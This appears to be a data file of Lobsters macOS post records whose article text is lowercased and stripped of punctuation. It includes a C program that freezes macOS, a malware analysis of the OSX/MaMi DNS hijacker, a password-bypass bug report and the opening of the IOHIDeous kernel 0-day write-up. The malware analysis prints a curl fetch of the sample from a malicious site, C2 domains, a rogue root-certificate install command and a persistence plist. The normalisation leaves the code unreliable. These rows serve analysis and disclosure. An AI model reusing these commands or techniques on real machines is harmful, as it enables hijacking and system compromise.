hopeful apple consider providing acglike mitigation macos io meantime hopefully blog post serf useful resource folk exploring sandboxing exploit mitigation macos
343,Lobsters,mac,Apple macOS,I think I found a Mac kernel bug?,https://jvns.ca/blog/2018/01/28/mac-freeze/,think found mac kernel bug,rbspy tried reproduce sierra mysterious freeze mac http think c program freeze part mac bug affecting htop github issue htop mac comment workaround twitter thread post,working mac support rbspy accidentally found something look like mac kernel bug basically managed write short line c program reliably cause p stop working without allocating memory anything like seems kernel bug high sierra sierra someone tried reproduce sierra look like new bug mysterious freeze mac past week building mac support rbspy ruby profiler put mac support branch github yesterday amazing early adopter tried branch reported froze computer activity monitor stopped working open new terminal etc extremely surprising could happen detailed report http really mystified could program running root freeze someone computer somebody suggested maybe program allocating lot memory think turn memory allocation problem c program freeze part mac parkr incredibly helpful managed narrow problem right calling taskforpid mach function since taskforpid seemed issue worked reproducing issue small c program program show bug run loop bit racey sometimes need try time freeze include machmachinith include machporth include syswaith include unistdh include stdioh int main pidt pid fork pid execv usrbintrue null machportnamet task machportnull taskforpid machtaskself pid task printf ran taskforpidn int waitstatus wait waitstatus behaviour see run freezemac example program hang run p another tab p hang display output also trying ctrlc stop p work happens mac developing running high sierra core issue seems exec new program like usrbintrue immediately run taskforpid program process ran taskforpid hang p stop working though terminate ctrlc thing seem go back normal want try mac run program risk freeze thing everything go back normal press ctrlc know happen run wget http cc freezemac freezemacc freezemac try running p starting activity monitor nt work bug affecting htop somebody twitter pointed github issue htop mac people reporting htop sometimes sporadically freeze computer way terminal start activity monitor work comment grrrrrrrrr say race condition taskforpid look poc similar workaround weird really understand underlying kernel issue anyway workaround run taskforpid process immediately exec ing instead sleep millisecond first hopefully new knowledge get rbspy work mac without freezing user computer system programming weird exciting though thought question twitter thread post
344,Lobsters,mac,Apple macOS,How do you read the memory maps of a Mac process?,https://jvns.ca/blog/2018/01/26/mac-memory-maps/,read memory map mac process,need memory map attempt vmmap man page super slow http opensourceapplecom attempt reimplement vmmap rust c example code vmmap clone mainrs mach crate http githubcomandrewdavidmackenzielibprocrs rust program way faster vmmap useful resource reading memory map mac process,hello last day trying figure get memory map mac program need memory map profiling need address variable rubyversion know structs laid rubycurrentthread get stack trace getting address variable thaat hard often symbol table ruby binary looking aslr address space layout randomization binary loaded memory random place need find address rubyversion symbol table find ruby binary loaded memory process memory map add together also subtract value mhexecuteheader symbol linux get memory map looking procpidmaps file look like address range permission eg rxp size inode number possibly filename file mapped rxp r p rwp rwp heap rxp p r p rwp mac memory map basically structure getting quite bit harder trying mac gave lot appreciation linux everything text file proc philosophy feel little janky sometimes parsing text file getting memory map linux took like hour done trying figure mac taken like day still finished attempt vmmap first attempt use binary called vmmap man page print process memory map vmmap wide pid got memory map wanted neat however vmmap super slow reason take second get memory map forum process read somewhere though find reference vmmap pause process taking memory map find source verify vmmap slow know source vmmap binary let know http opensourceapplecom far tell happy vmmap slow reason delay annoying user importantly vmmap really pausing process good really prefer profiling tool interfere process profiling want use vmmap attempt reimplement vmmap rust okay want use vmmap tool next step reimplement functionality least part need rust help c example code vmmap clone wrote partial sketchy vmmap clone rust code mainrs used mach crate rust binding bunch mac kernel function call also learned mac bsd concept port port protected message queue communication task task send right receive right port get single memory map program interface function little weird give port id address give first memory map address basically function wrap machvmregion function mach microkernel header mach function usrincludemach h commented code bit us http githubcomandrewdavidmackenzielibprocrs crate regionfilename function give filename library associated memory map use version crate github master released version useafterfree bug fn machvmregion targettask machportnamet mut address machvmaddresst option region let mut count mem sizeof machmsgtypenumbert let mut objectname machportt need create new size info structs function call read data let mut size unsafe mem zeroed machvmsizet let mut info unsafe mem zeroed vmregionbasicinfodatat let result unsafe call underlying mach function mach vm machvmregion targettask vmtaskentryt mut address mut size vmregionbasicinfo mut info mut vmregionbasicinfodatat vmregioninfot mut count mut objectname result kernsuccess return none us let filename match regionfilename address ok x x none region size size info info address address count count filename filename made happy could write reasonable first approximation vmmap clone line rust rust program way faster vmmap rust program hoped run like something faster vmmap still know exactly vmmap slow dtruss tell anything terribly helpful whatever rust program thing still major issue rust vmmap clone actually give memory map process right dynamically linked library including ruby library need address filename stored place called dyld shared cache something still understood know read yet bunch code dyld thing link planning read think able get work useful resource reading memory map mac process useful resource found far reading memory map mac figuring support mac rbspy last day interesting never done mac bsd system programming still trying understand basic concept like port feel like making good progress
345,Lobsters,mac,Apple macOS,Prepare for changes to macOS Server,https://support.apple.com/en-us/HT208312,prepare change macos server,change introduced macos server learn current future support documentation help transition service included macos server later service migrated macos server macos high sierra later service status bind unbound knotdns openvpn softether vpn wireguard dovecot postfix courier kerioconnect calendarserver davmail radicale kerio connect mediawiki pmwiki xwiki apache http server nginx lighttpd calendarserver davmail citadel kerio connect netsus bsdpy ejabberd openfire prosody freeradius contact vendor,change introduced macos server hosted service become need keep software date important making change macos server learn current future support apple continues develop support macos server includes open directory profile manager xsan management popular server server file sharing server time machine server bundled every installation macos high sierra later even customer access essential service extra cost starting macos server apple longer bundle open source service calendar server contact server mail server dns dhcp vpn server website macos server customer get service directly opensource provider way macos server customer install secure uptodate service soon available apple published documentation help transition service included macos server later following service included fully supported macos server later profile manager open directory xsan service migrated macos server macos high sierra later service available macos high sierra later found system preference sharing file server caching server time machine server service status table show status macos server service available alternative service status alternative ftp removed server sftpssh server doc removed server icloud document apachewebdav dhcp ui tool removed server bootpd built macos dns removed server bind unbound knotdns vpn removed server openvpn softether vpn wireguard firewall ui tool removed server pf firewall built macos mail server removed server dovecotpostfix courier kerioconnect calendar removed server calendarserver davmail radicale kerio connect wiki removed server mediawiki pmwiki xwiki confluence wordpress wmx file website ui tool removed server apache http server built macos nginx lighttpd contact removed server calendarserver davmail citadel kerio connect netbootnetinstall ui tool removed server bootp tftp http nfs built macos netsus bsdpy message removed server ejabberd openfire prosody radius removed server freeradius airport management removed server airport utility information product manufactured apple independent website controlled tested apple provided without recommendation endorsement apple assumes responsibility regard selection performance use thirdparty website product apple make representation regarding thirdparty website accuracy reliability contact vendor additional information published date december
346,Lobsters,mac,Apple macOS,Automatic keyboard/input source switching for OSX,https://github.com/jeantil/autokbisw,automatic keyboardinput source switching osx,autokbisw automatic keyboard input source switcher motivation installation binary source,autokbisw automatic keyboard input source switcher motivation small utility born frustation mob programming sesssion session took place french mac book pro using pair french pc keyboard programmer used eclipse others intellij linux others intellij mac osx automatically switch layout keyboard activated nt change keymap meaning remember changing o ide keymap time switched developper software remove one switch memorizes last active osx input source given keyboard restores automatically keyboard becomes active keyboard installation binary download one binary package repository release unzip content whatever folder suit run want program start automatically log copy provided plist file librarylaunchagents load manually first run cp eubyjeanautokbiswplist librarylaunchagents launchctl load librarylaunchagentseubyjeanautokbiswplist brew install jeantilautokbiswautokbisw source clone repository make sure xcode installed run following command swift build configuration release output path built program something like pwd buildreleaseautokbisw run install cp pwd buildreleaseautokbisw usrlocalbin cp autokbisweubyjeanautokbiswplist librarylaunchagents launchctl load librarylaunchagentseubyjeanautokbiswplist
347,Lobsters,mac,Apple macOS,Analyzing a New macOS DNS Hijacker: OSX/MaMi,https://objective-see.com/blog/blog_0x26.html,analyzing new macos dns hijacker osxmami,created post whatsyoursign currently marked clean jtool procinfo noarfromspace mystery reinstall macos lulu,ay mami analyzing new macos dns hijacker osxmami love blog post support tool writing patreon mahalo barely two week old already look like got new piece macos malware hooray want play along shared malware binary executable mami downloaded password please nt infect background earlier today someone malwarebytes forum created post titled dns hijacked nt seen answer mikeofmaine far aware nt recent macos malware hijack dns setting intrigued without adieu let dive analyzing calling osxmami analysis though currently unaware malware infection vector hosted various site http regardensinfo curl l http regardensinfo mami total received xferd average speed time time time current dload upload total spent left speed macbookpro downloads patrickw file mami mami macho executable shown whatsyoursign nothing special file unsigned macho executable often case new malware currently marked clean engine virustotal hopefully change shortly av product start adding detection speaking new load malware binary disassembler find app version due low version number may seem indicate malware likely nt around long db appversion nappbuild db db dig disassembly let dump objectivec class name method often allow u quickly gain insight malware likely capability least guide analysis use j levin invaluable jtool utility dump info jtool objc v mami interface appdelegate setupcert setupdns takescreenshotat mouseclick runapplescript interface sbmamisettings initmamisettings programarguments runatload launchonlyonce interface sbnetwork downloadfile atpath sendasyncrequestwithurls andmethod andbody interface sbfilesystem writestring topath runcmd andpipetocmd withparams runcmd withparams runcmd withparams anduser interface sbcryptosystem isadmin protocol elevateprivilegeswithparams protocol relaunchwithprivilegesandparams interesting method course continue analysis confirm seems malware indeed dns hijacker method setupdns host ability taking screenshots generating simulated mouse event perhaps persists launch item programarguments runatload downloading uploading file executing command jumping back disassemlby within application main entrypoint appdelegate applicationdidfinishlaunching see massive encrypted string pass setdefaultconfiguration method sbconfigmanager setdefaultconfiguration applying classified decryption method learned intern working nsa cryptanalysis exploitation service ce group trivial decrypt configuration data totally kidding internship decrypt step method debugger lldb data sitting decrypted memory lldb mami lldb target create mami current executable set mami lldb po rax default affiliate build compilationid confirmationendtime confirmationstarttime downloadcompletetime downloadlocation downloadretrycount downloadstarttime downloadurl exceptionid executelocation executionendtime executionstarttime exitcode externalid filecrc hardwareid hostsactive installerid isadmin false oldsecondarydns osbuild osid productid productname publisherid registerdate registerdsrc reportid runargs screenx screeny secondarydns servicepack sessionid status stepid tag tracker usertime validateendtime validatestarttime version dnschanger affiliate blacklistdns encrypt true externalid productname dnschanger publisherid raw true report dnschangeractivity async false body r dnschanger report dnschangeractivity template rc dnschanger connectiontimeout domain honouncilinfo gorensininfo httpheaders name contenttype value applicationxwwwformurlencoded name useragent value querystring r dnschanger report dnschangeractivity template rc dnschanger requestmethod requesttimeout retrycount sendport sendprotocol http template affiliate affiliate build build compilationid compilationid dns hostsactive hostsactive hostsconfig template secondarydns encrypt true exceptionid exceptionid expand true externalid externalid hardwareid hardwareid isadmin isadmin olddns hostsactive hostsactive hostsconfig template oldsecondarydns osbuild osbuild osid osid productname productname publisherid publisherid registerdate registerdate registerdsrc registerdsrc reportid reportid reportname dnschangeractivity reporttype screenx screenx screeny screeny servicepack servicepack sessionid sessionid status status tag tag tracker tracker usertime usertime version version urlpath timereport async false body r dnschanger report timereport template rc dnschanger connectiontimeout domain squarterainfo httpheaders name contenttype value applicationxwwwformurlencoded name useragent value querystring requestmethod requesttimeout retrycount sendport sendprotocol http template affiliate affiliate build build compilationid compilationid dns hostsactive hostsactive hostsconfig template secondarydns encrypt true exceptionid exceptionid expand true externalid externalid hardwareid hardwareid isadmin isadmin osbuild osbuild osid osid productname productname publisherid publisherid reportid reportid reportname timerequest screenx screenx screeny screeny servicepack servicepack sessionid sessionid status status tag tag tracker tracker usertime usertime verificationid verificationid version version urlpath setupdns sharedstorage user username libraryapplication support storagetimeout tag timeoutdns hightimeout lowtimeout mediumtimeout tracker installerid reporttemplates reportconfig async false body connectiontimeout domain httpheaders name contenttype value applicationxwwwformurlencoded name useragent value querystring requestmethod requesttimeout retrycount sendport sendprotocol http async true body connectiontimeout domain httpheaders name contenttype value applicationxwwwformurlencoded name useragent value querystring requestmethod requesttimeout retrycount sendport sendprotocol http urlpath affiliate affiliate build build compilationid compilationid dns hostsactive hostsactive hostsconfig template secondarydns exceptionid exceptionid externalid externalid hardwareid hardwareid isadmin isadmin osbuild osbuild osid osid productname productname publisherid publisherid reportid reportid screenx screenx screeny screeny servicepack servicepack sessionid sessionid status status tag tag tracker tracker usertime usertime version version affiliate affiliate build build compilationid compilationid dns hostsactive hostsactive hostsconfig template secondarydns exceptionid exceptionid externalid externalid hardwareid hardwareid isadmin isadmin osbuild osbuild osid osid productname productname publisherid publisherid registerdate registerdate registerdsrc registerdsrc reportid reportid screenx screenx screeny screeny servicepack servicepack sessionid sessionid status status tag tag tracker tracker usertime usertime version version template oldsecondarydns filltemplate oldsecondarydns filltype string secondarydns filltemplate secondarydns filltype string version ok lot configuration data interesting part probably setupdns array setupdns see dns address used shortly lldb set breakpoints method interest setupcert setupdns method lldb mami lldb b appdelegate setupcert breakpoint dcdata appdelegate setupcert address lldb b appdelegate setupdns breakpoint dcdata appdelegate setupdns address breakpoints hit step thru instruction fired procinfo opensource process monitor recently wrote github procinfo let malware run see voting latter almost midnight procinfo starting process monitor process monitor enabled pid path usrbinsecurity args usrbinsecurity addtrustedcert r trustroot k librarykeychainssystemkeychain usersuserdesktopdcdatabin first see malware invoking security tool install new certificate dcdatabin downloaded internet let take peak cert openssl inform der dcdatabin dcdatapem openssl dcdatapem text certificate data version serial number ab signature algorithm issuer cil stgush dan lhertzilia ogreenteam internet ltd ouweb cncloudguardme validity jul gmt jul gmt subject cil stgush dan lhertzilia ogreenteam internet ltd ouweb cncloudguardme openssl dcdatapem fingerprint noout ff also view installed certificate via keychain access app system keychain root certificate authority mitm anybody back process monitoring procinfo process start pid path bincp args bincp librarypreferencessystemconfigurationpreferencesplist librarypreferencessystemconfigurationpreferencesplistold interesting mucking systemconfigurationpreferencesplist file guessed dns setting right remember two dns address decrypted config data added plist file grep b librarypreferencessystemconfigurationpreferencesplist dns serveraddresses inclined use ui see change via system preference app network pane dns setting infected host hijacked well interesting method eg takescreenshotat mouseclick runapplescript brief reversinganalysisdebugging session nt see executed moreover though malware embedded launch item plist nt attempt persist though altered system setting really nt need hang around fact selfdelete coerced malware execute method modifed launch item plist initmamisettings value configured programarguments key tell o persistently execute simply l la sleep l lldb mami lldb po rax abandonprocessgroup key abandonprocessgroup key true footerstage dict plist headerstage xml version encoding doctype plist public appledtd plist http plist version dict keepalive key keepalive key true labelstage key label key string label string programarguments key programarguments key array string binsh string string c string string programarguments string array runatload key runatload key true lldb po rsi l la sleep l perhaps order method executed malware persisted requires attacksupplied input precondition nt met vm keep digging window relative chatting noarfromspace malware dug interesting article titled mystery article dicusses piece window malware named dnsunlocker also hijacked dns setting window system dnsunlocker malware seems closely related osxmami reason dns server dnsunlocker hijack window victim dns server osxmami hijack mac victim dns server certificate certifcate installed malware specimen clearly dnsunlocker older circa window closely related osxmami guess say likely osxmami fully rewritten macos version dnsunlocker lot extra macosspecific evilness conclusion ok wrap osxmami nt particular advanced alter infected system rather nasty persistent way installing new root certifcate hijacking dns server attacker perform variety nefarious action maninthemiddleing traffic perhaps steal credential inject ad let end q q get infected time unknown however likely attacker using rather lame method malicious email webbased fake security alertspopups socialengineering type attack target mac user q know infected check dns setting looking see set check via terminal eg networksetup getdnsservers wifi via system preference app network pane also check malicious cloudguardme certifcate installed appear system keychain q disinfect often malware install malware allow remote attacker ever want thus wereare infected suggested fully reinstall macos however probably get away simply resetting dns server deleting malicious certifcate remove dns server open system preference application click network icon advanced button finally dns button infected see malicous dns server selected server click button delete remove certificate open keychain access application click system keychains top left infected see malicious certificate cloudguardme right click certifitcate select delete remove q av product protect evenutally appear recomment tool firewall detect block outgoing traffic currently working free opensource firewall named lulu detect osxmami network traffic q discover malware good friend brought attention happen blog thing macos malware q name osxmami since already several imho unrelated malware specimen perform dns hijackering named dnschanger etc decided call osxmami due core class malware named sbmamisettings love blog post tool support via patreon mahalo
349,Lobsters,mac,Apple macOS,Alternate Computer Universes,https://www.exolymph.news/2017/07/27/alternate-computer-universes/,alternate computer universe,john ohno proposal swyftcard mac next computer archy john ohno ismael villafranco,following guest dispatch written john ohno aka musing world might lightly edited context idea cyberpunk tied tightly assumption aesthetic early unlike today early saw peak cambrian explosion diversity regard home computer would later pathway would culled midtolate gui machine like macintosh amiga atari st pushed micros early poor marketing business decision killed amiga left atari shell former self neuromancer published comparing home computer based merit hard dysfunctional strange way apple line began selling first apple iicompatible machine capable typing lowercase letter released sinclair machine strapped ram would delete portion number big user typed lineage survived arbitrary minor change history would produce completely distinct computer universe alien eye essay like tell specific fork computer history one handled differently would replaced iconic influential machine one radically different like talk macintosh project steve job apple released lisa flop first commercial machine parcstyle gui mouse slow use price point dollar today requiring hard disk addon cost amount computer people willing pay much flashy unusable toy would car sold unit lisa job baby figuratively literally named daughter also heavily control based extrapolation limited understanding demo alto parc however time released already jumped ship project taken macintosh project realizing lisa would flop job distanced taken jef raskin macintosh project turning budget version lisa interesting feature removed development moved pascal assembler name efficiency part story generally pretty well known part job myth setback force reconsider really important lead creation macintosh get factored myth raskin original plan macintosh revolutionary practical macintosh macintosh began variant dedicated word processor interesting twist time direction jef raskin previously sail parc macintosh designed time would use light pen rather mouse selection manipulation button word use like stylusbased touch screen device primary mean navigation would something called leap key wherein modifier key would switch behavior typing insertion search raskin claimed navigation scheme three time faster using mouse considering limit scrolling speed lisa similar problem bitmapped display device coming apple time seems like underestimate long document quick text search would much faster normal operation unit would act like dedicated word processor fact general purpose computer programmable normal way program writing code directly text document highlighting upon language identified compiled code become clickable button clicked executed word system optimized literate programming proposal time project takeover little ambitious support dialup service access database something like minitel prodigy today web aplderived language control project taken away raskin however core idea mentioned migrated heir project apple ii addon called swyftcardand later dedicated word processor called canon cat ultimately thing killed original macintosh project first raskin job abrasive people big ego raskin circumvented job rather convincing order get macintosh project approved made project easy target later mac pp second raskin loudly criticized lisa project exactly problem would later turn specifically considering cost speed became slow expensive machine way ineffective making lisa faster supporting tech widespread use pascal system software highres bitmapped display multithreading blamed lisa bloat word possible maybe even straightforward claim raskin partially blame lisa failure despite working project directly fully blame making macintosh project juicy target takeover swyftcard implemented many planned feature limited information find look like sell well addon apple ii released shortly macintosh computer landscape point changed macintosh project job many way product spite attempt prove lisa clone could made budget dedicated word processor project two year also attempt demonstrate project needed reject pascal structured programming element good design raskin championed nevertheless incorporated aspect raskin worldview like heavily driven cost concern trying avoid multiple distinct idiomatic way performing task result project le impressive lisa front except speed marketing time rolled around amiga atari st come positioned direct competition macintosh machine cheaper technically superior supporting color multithreading twice ram cpu double speed apple already marketing war super bowl ad macintosh took another decade start selling well design assumption heavily influenced gui machine appeared later raskin licensed swyftcard design canon produced canon cat year window word year ibm pc clone world adopted apple assumption canon cat cost today money many people would pay capable machine time marketing slipups canon resulted poor sale raskin claimed failure due part steve job successfully pitched canon next computer time also suggested canon canceled cat due internal rivalry within division running cryptic full page advertisement wall street journal canon cat coming month available canon failed follow never airing completed tv commercial cat went sale allowed cat sold typewriter salesperson prevented raskin selling cat directly tv demonstration easy use shortly thereafter stock market crash panicked information appliance venture capitalist drained million dollar company depriving capital needed able manufacture sell swyft end raskin macintosh exerted little influence landscape computer interface job macintosh nearly unrelated project enormous ramification gui machine prior considered toy typically pointing device high resolution graphic associated video game business machine maintained professional image avoiding mouse graphic macintosh competitor changed permanently idea popularized macintosh team like hiding complexity avoiding configurability omitting expansion port huge impact way user interface designed world based raskin macintosh would different world optimized fast text editing program distributed source inside text document document user interface designed quick keywordsearchbased navigation handful system like exist today although incremental search become common web browser past decade template language like ruby rail ren py jsf along notebook interface like jupyter resemblance swyft ui raskin continued playing ui idea death last big project archy alternate computer universe written john ohno header photo ismael villafranco
350,Lobsters,mac,Apple macOS,Tips And Tricks for Shipping a PyGame App on the Mac,https://glyph.twistedmatrix.com/2018/01/shipping-pygame-mac-app.html,tip trick shipping pygame app mac,written spoken concrete tidbit game made quick pyweek changed binary wheel variety python version gave apple hundred dollar able run step development setup official build pythonorg homebrew made dumb little thing step make icon favorite one step include dang file care performance step build quarantine step code sign xcode apple id credit card developer id application make sure backup certificate private key step become aware new annoying requirement added new codesigning requirement step write entitlement plist allows python work step sign thing step archive dmgbuild step actually rest step request notarization step wait minute step finish notarizing finally step download auditwheel nathaniel smith coda personal flatpak let know,written spoken length shipping software abstract sometimes even occasional concrete tidbit advice really complete honor delightful game made quick like help package game even quicker made ten year ago made prototype little pygame thing wanted share friend building said prototype quick fun different usual sort work project got big enough started wonder would possible share result thus began long winter discontent packaging tool might one think history pyweek example look history game distributed github repository best apps launch seems like people participate game jam unity push button publish game steam people participate game jam python wander away build toolchain defeat perhaps also python programmer built something pygame want put website friend download perhaps many friend family mac user perhaps tried make thing got nothing inscrutable tracebacks corrupt app bundle trouble read enjoy changed thing work first tried different packaging ecosystem general far le buggy dependency like setuptools become far reliable well many thanks donald stufft whole pypa binary wheel exist community getting better better building selfcontained wheel include necessary c library relieving burden application author figure gnarly c toolchain issue pygame project ship wheel variety python version mac window linux remove whole huge pile complexity generally understanding c toolchain specifically understanding sdl build process actively maintained many bug fixed many thanks ronald oussoren et al finally broke gave apple hundred dollar produce app normal human might actually able run still weird little corner case work around hence post mostly story year effort python packaging community resulted tool pretty close working box step development setup get good python recommendation use official build pythonorg already compiled way run wide range mac new old use recent python version variety lowlevel improvement make better redistribution previous recommendation use homebrew wrong use homebrew might build source might way work lot mac going compile python source need familiarize bunch tip trick making sure enable cpuspecific optimization toorecent sdk requirement go pyenv accidentally configure python way good redistributables definitely use system python probably nothing work probably also want use virtualenv development post build forreal thing people download part magic python interactive realtime dynamic nature everything running full build pipeline every time change file asset slow annoying however weird thing certain part macos gui work right case mostly keyboard focus unless code appears application bundle made dumb little thing let fake enough o hassle need pip install venvdotapp venvdotapp inside virtualenv making pygame app finally pip install requirement virtualenv including pygame step make icon good apps need icon right young one would open resedit resorcerer mpw codewarrior project builder icon composer xcode create new icon resource cicn resource tiff file icns file nowadays weird opaque stuff xcassets file contentsjson bundle default swift objective c project template honestly bothered keep track going nonsense luckily o ship macosspecific image processing helpfully convert icon make png file favorite image editor alpha channel want use icon run something like sip format icns iconpng iconicns somewhere build process produce icon appropriate format also one additional wrinkle pygame launched game pygame helpfully assigns cute ugly default pygame icon running process avoid need two line somewhere initialization code somewhere pygamedisplayinit matter pygamedisplay anything pygamesdlmainosx import installnsapplication installnsapplication obviously pretty macspecific probably want kind platformdetection conditional perhaps one step include dang file care performance unfortunately still try really hard jam code zip file break world various hilarious way app probably resource want load pygame supposedly package yourpackage setuppy address come recipe neither thing worked instead convinced splat file using notquitepublic plugin api import setuptools import findpackages setup pkgs findpackages class recipeplugin object staticmethod def check modulegraph localpackages pkgs localpackages pygame return package localpackages recipeplugin app mymainfilepy datafiles option optionsupdate iconfile iconicns plistdict cfbundleidentifiercomexampleyourdomainnotmine setup name game appapp datafilesdatafiles includepackagedatatrue option option setuprequires packagespkgs packagedata gal gif html jar j mid png py pyc sh tmx ttf xcf definitely somewhat le efficient default stuffing code single zip file counterpoint actually work step build hopefully point python setuppy get shiny new app bundle dist nameapp go hell quarantine yet launch point sorry often debug obvious failtolaunch issue running executable command line running dist nameappcontentsmacos name although run slightly different environment double clicking env var example app need env var work might mysteriously work also print tracebacks terminal slightly easier find consoleapp app least run locally time step code sign tutorial found involve xcode project goop clear happening underneath despite fact introductory doc quite underlying model codesigning stuff totally common across gui commandline case however actually getting cert requires xcode apple id credit card paying hundred dollar go xcode go account hit log shiny new account go hit little assuming like want put something website submit mac app store choose developer id application probably think want app wanting distribute mac app next anything else make sure backup certificate private key really want lose private key associated cert quit xcode done gui need know identifier signing key though output command security findidentity v p codesigning grep developer id sed e probably want put build script since want sign identity every time command assume copied one line result command done export identity step become aware new annoying requirement update macos catalina catalina apple added new codesigning requirement even apps distributed outside app store still submitted approved apple order notarized need codesign app also add hardenedruntime exception entitlement allow python work directly sign every shared library part app bundle actual codesigning step little complicated step write entitlement plist allows python work one feature notarization intended strongly encourage feature macos opts stricter runtime behavior designed stop malware one thing hardened runtime disable writable executable memory used jits ffis malware unfortunately builtin ctypes module various popular bit stuff us cffi including pyopenssl require writable executable memory work furthermore actually import ctypes bootstrapping phase even get code start running perform workarounds unless enabled want use python project requires ctypes directly make long sad story significantly shorter happier create entitlement property list enables magical property allows work look like xml version encoding doctype plist public appledtd plist http plist version dict key comapplesecuritycsallowunsignedexecutablememory key true dict plist subsequent step assume put file called entitlemeplist project root step sign thing notarization also requires executable file bundle main executable properly codesigned submitting need first run codesign command across shared library something like cd dist find name app iname iname dylib read libfile codesign sign identity entitlement entitlemeplist deep libfile force option runtime done finally sign bundle codesign sign identity entitlement entitlemeplist deep name app force option runtime app codesigned step archive right way probably use dmgbuild something like promised quick dirty beautiful best practice make zip archive preserve symbolic link couple option open dist finder window come right click app cd dist zip yr nameappzip nameapp importantly use zip command line tool must use option without downloadable app bundle somewhat mysteriously broken even though one zipped fine step actually rest step request notarization notarization process somewhat resistant fully automating submit apple email result notarization email indicates notarization succeded successful result bundle thing notarize archive need step first need xcrun altool notarizeapp file name appzip type osx username yourdeveloperidemail primarybundleid yourbundleid sure yourbundleid match cfbundleidentifier told tool find app bundle inside archive also need type icloud password developer id account step wait minute anxiously check email hour hope get error step finish notarizing finally apple record notarization tooling recognize need information confirmation email previous command make sure running exact app directory built archived version differs way xcrun stapler staple name app finally want archive zip qyr name notarizedappzip name app step download ideally point everything working make sure codesigning archiving notarizing rearchiving went correctly either pristine virtual machine dev tool python installed nonprogrammer machine serve purpose probably need relatively recent macos experience shown apps made using technique definitely work high sierra later definitely break yosemite earlier probably start working o version tooling know clearly tell whether mac app depends detail local machine even dependency auditwheel macos updated turn auditwheel like thing macos delocate fact predated inspired auditwheel thanks nathaniel smith update provided uh january gotten around updating nevertheless always good idea check final app build fresh computer announce coda expecting get end download cool game sorry disappoint really halfbroken prototype way ready public consumption given current load personal professional responsibility definitely expect anything area time soon know ever year experience know nearly impossible summon motivation work small project like without knowledge end result usable way hope help someone else set python gamedev pipeline really like turn series part linux perhaps using flatpak good thing part window however given aforementioned time constraint think going time energy research got appropriate knowledge love host guest post blog even link post helped question correction like write linux window version post let know
351,Lobsters,mac,Apple macOS,AppStore Preferences lock is a lie,https://openradar.appspot.com/36350507,appstore preference lock lie,appstore preference lock lie rdar comment please note,appstore preference lock lie originator eholtam number rdar date status open resolved product macos sdk product classification security reproducible always summary appstore preference system preference unlocked local admin bogus password step reproduce log local admin open app store prefpane system preference lock padlock already unlocked click lock unlock enter bogus password expected result authorization fail actual result authorization succeeds grant access change appstore preference version note appears logged local admin tested nonadmin account unlock prefpane incorrect credential comment please note report posted necessarily seen apple problem submitted bugreportapplecom posted please post information radar filed please include apple confidential information post thank
352,Lobsters,mac,Apple macOS,Docker for Mac with Kubernetes,https://blog.docker.com/2018/01/docker-mac-kubernetes/,docker mac kubernetes,docker mac kubernetes heard edge release channel later date docker store edge channel activation instruction docker mac kubernetes elton stoneman video community forum github,docker mac kubernetes heard dockercon europe proud announce docker mac beta kubernetes support publicly available part edge release channel hope excited release run single node kubernetes cluster right mac use kubectl command docker command control container first thing keep mind docker mac required kubernetes feature accessible macos docker window docker enterprise edition beta follow later date need install new copy docker mac download docker store edge channel required kubernetes support still considered experimental release enable download use kubernetes component must edge channel docker mac version later updating already using kubernetes tool already running version kubectl pointed another environment example minikube want follow activation instruction change context dockerfordesktop docker mac window popular way configure docker dev environment used everyday hundred thousand developer build test debug containerized apps developer building dockercompose swarmbased apps apps destined deployment kubernetes get simpletouse development system take optimal advantage laptop workstation container task build run push run docker instance shared set image volume container docker mac simple install docker container running mac minute docker mac autoupdates continue getting latest docker product revision experimental kubernetes support docker ce mac docker provide user endtoend suite containermanagement software service span developer workstation running docker mac window test cicd production system onpremises cloud running docker enterprise edition ee beauty building docker mac window deploy exact set docker container image desktop docker enterprise edition ee production system docker mac window single node system building testing preparing ship application docker ee provides security control scale needed manage production application eliminate worked machine problem docker container running docker engine docker swarm kubernetes orchestrator coming soon ee thing try new kubernetes looking introductory exercise try resource docker mac kubernetes page instruction getting example app running follow along docker developer advocate elton stoneman short video demonstrating activating kubernetes deploying application using docker compose kubernetes manifest send u feedback send u feedback idea improvement bug complaint make docker desktop better use docker community forum general discussion also directly file technical issue github call action
353,Lobsters,mac,Apple macOS,IOHIDeous - IOHIDFamily 0day,https://siguza.github.io/IOHIDeous/,iohideous iohidfamily,iohideous introduction readme iokitutils kext kernutils twitter technical background class vulnerability source putting exploit together getting access triggering bug shmem basic reading writing memory cursor problem cursor problem leaking kernel slide tedious way previously exploited kmsg luca todesco jailbreak tihmstar phœnix phœnixnonce cursor problem leaking kernel slide cheater way devised grus et al getting control turning rop two benjamin randazzo trident wreaking havoc readme kext conclusion woah project github twitter reference,siguza dec published dec iohideous iohidfamily introduction tale macosonly vulnerability iohidfamily yield kernel rw exploited unprivileged user iohidfamily notorious past many race condition contained ultimately led large part rewritten make use command gate well large part locked mean entitlement originally looking source hope finding lowhanging fruit would let compromise io kernel know part iohidfamily exist macos specifically iohidsystem contains vulnerability discussed herein exploit accompanying writeup consists three part poc make poc target macos version crash kernel prove existence memory corruption leak make leak target high sierra prove separate kaslr leak needed hid make hid target sierra high sierra see readme achieves full kernel rw disables sip prove vulnerability exploited unprivileged user recent version macos note ioprint ioscan utility using writeup available iokitutils repository also using kext along kernutils inspect kernel memory kind question feedback feel free hit twitter via mail net siguza technical background order understand attack surface well vulnerability need know involved part iohidfamily start iohidsystem class userclients offer currently three iohiduserclient iohidparamuserclient iohideventsystemuserclient used fourth iohidstackshotuserclient commented like almost userclients iohidfamily day iohideventsystemuserclient requires entitlement spawned comapplehidsystemuseraccessservice however two iohidparamuserclient actually spawned unprivileged process interest u iohiduserclient arguably powerful three normal system operation held windowserver bash ioprint iohiduserclient iohiduserclient iohiduserclient oskern successful xml version encoding doctype plist public appledtd plist http plist version dict key iouserclientcreator key string pid windowserver string key iouserclientcrossendiancompatible key true dict plist important point turn iohidsystem restricts number iohiduserclients exist given time exactly one specifically enforced evopencalled class variable set true iohiduserclient spawned false closed variable checked iohidsystem evopen turn called iohidsystem newuserclientgated even race bottom line one iohiduserclient given moment chance code run windowserver long running userclient already snatching straightforward get later gon na look actually us userclient iohidsystemiohiduserclient offer shared memory event queue certain cursorrelated data windowserver map address space via clientmemoryfortype memory split three part packed order iohidsystem extensively used evglobals address assigned evg class variable even though unused address private driver memory similarly assigned ev initialise memory iohidsystem offer createshmem function iohiduserclient implement external method like pretty much iohidfamily interface day iohidsystem createshmem neatly gated prevent concurrent access real implementation resides iohidsystem createshmemgated sierra earlier function actually allocated shared memory necessary since high sierra iohidfamily version duty shifted iohidsystem init regardless code path eventually end iohidsystem initshmem responsible cleaning 